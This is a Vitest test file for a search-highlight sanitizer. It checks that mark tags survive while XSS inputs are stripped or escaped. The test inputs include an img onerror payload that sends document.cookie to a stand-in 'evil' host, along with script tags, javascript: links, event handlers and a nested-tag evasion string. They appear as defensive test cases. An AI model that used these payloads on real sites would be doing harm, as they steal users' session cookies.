import DOMPurify from "dompurify";
import { describe, expect, it } from "vitest";
import {
  sanitizeSearchHighlight,
  searchHighlightText,
} from "./searchHighlight";

const MARK = '<mark class="search-highlight">';

describe("sanitizeSearchHighlight", () => {
  it("keeps the mark tag and its class", () => {
    const html = `Navigate to ${MARK}login</mark> page`;
    expect(sanitizeSearchHighlight(html)).toBe(html);
  });

  it("removes an image with an event handler", () => {
    const html = `${MARK}login</mark> <img src=x onerror="fetch('//evil/'+document.cookie)">`;
    const safe = sanitizeSearchHighlight(html);
    expect(safe).not.toContain("<img");
    expect(safe).not.toContain("onerror");
    expect(safe).toContain(`${MARK}login</mark>`);
  });

  it("removes scripts, anchors and inline styles but keeps their text", () => {
    const safe = sanitizeSearchHighlight(
      `<script>alert(1)</script><a href="javascript:alert(1)">link</a><b style="x">bold</b> ${MARK}term</mark>`
    );
    expect(safe).toBe(`linkbold ${MARK}term</mark>`);
  });

  it("drops attributes other than class from mark", () => {
    const safe = sanitizeSearchHighlight(
      `<mark class="search-highlight" onmouseover="alert(1)" style="x">t</mark>`
    );
    expect(safe).toBe(`${MARK}t</mark>`);
  });

  it("leaves entity-encoded text encoded", () => {
    const html = `${MARK}login</mark> &lt;img onerror=x&gt; &amp; done`;
    expect(sanitizeSearchHighlight(html)).toBe(html);
  });

  it("escapes everything when no DOM is available", () => {
    const supported = DOMPurify.isSupported;
    DOMPurify.isSupported = false;
    try {
      expect(
        sanitizeSearchHighlight(
          `<scr<script>ipt>alert(1)</script> ${MARK}a</mark>`
        )
      ).toBe(
        "&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; &lt;mark class=&quot;search-highlight&quot;&gt;a&lt;/mark&gt;"
      );
    } finally {
      DOMPurify.isSupported = supported;
    }
  });

  it("returns an empty string for empty input", () => {
    expect(sanitizeSearchHighlight("")).toBe("");
    expect(sanitizeSearchHighlight(null)).toBe("");
    expect(sanitizeSearchHighlight(undefined)).toBe("");
  });
});

describe("searchHighlightText", () => {
  it("strips marks and decodes entities", () => {
    expect(
      searchHighlightText(`${MARK}login</mark> &lt;b&gt; &amp; &quot;x&quot;`)
    ).toBe('login <b> & "x"');
  });

  it("does not execute or keep markup from the fragment", () => {
    expect(
      searchHighlightText(`<img src=x onerror=alert(1)>${MARK}a</mark>`)
    ).toBe("a");
  });
});
